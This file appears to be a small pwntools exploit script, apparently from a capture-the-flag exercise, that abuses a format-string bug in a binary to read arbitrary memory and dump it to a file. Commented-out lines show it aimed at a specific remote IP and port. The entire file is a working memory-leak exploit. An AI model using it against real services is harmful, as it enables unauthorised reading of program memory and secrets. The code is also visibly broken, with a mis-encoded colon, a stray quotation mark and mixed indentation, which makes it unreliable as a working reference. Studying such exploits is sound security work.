from pwn import*

#This is a demo to leak data from a binary, the binary has a format overflow, just like "printf(buf)". But this demo can also be modified to leak data if the binary has other  loophole.

def leak_data(p, addr)£º #p is a process or a remote
	s = '%37$s' #can be modify
    tmp = (248-len(s))
    pad = tmp / 6 * 'ABCDEF' + (tmp % 6) * 'A'
    s+=pad + p64(addr)
    p.sendline(s)
    leak = p.recvuntil(pad, 5)
    p.recv(1024, 2)
    return leak"
	
def leak_binary(p, from_addr, to_addr, tag = "dump"):
	addr = from_addr
    filename = '%s_%08x_%08x' % (tag, from_addr, to_addr)
    f = open(filename, "wb", 0)
    try:
        while addr < to_addr:
            s = leak_data(p, addr)
            if len(s) > 0:
                f.write(s)
                addr += len(s)
            else:
                f.write('\x00')
                addr += 1
    except Exception as e:
        print "Error", e
        pass
    f.close()
	
#p = remote('78.46.224.86', 1337)
#leak_binary(p, 0x400000, 0x400000 + 0x1000)
#leak_binary(p, 0x600000 + 0x1000, 0x600000 + 0x1000 + 0x50)